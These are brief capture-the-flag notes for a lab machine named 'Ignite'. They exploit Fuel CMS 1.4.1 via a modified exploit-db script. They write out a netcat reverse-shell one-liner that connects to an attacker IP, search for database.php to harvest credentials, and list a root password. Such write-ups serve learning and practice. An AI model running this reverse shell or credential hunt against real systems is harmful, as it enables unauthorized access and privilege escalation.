# Ignite

```
export_ip = 10.10.169.144

[Enumerate]
1. Version : Fuel CMS 1.4.1 
2. exploit-db :  47138.py
3. Code Modifyed
4. Performing RevereShell 
-- [Command]
-- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.26.67 4444 >/tmp/f

[User :  Flag]
1. User.txt :  /www-data/user.txt


[Root : Flag]
1. check the database configure file
2. find / -name database.php 2>/&1 |grep -v "Permission denied"
3. cat "2 result file"
4. switch root
-- id :  root
-- pw :  mememe




```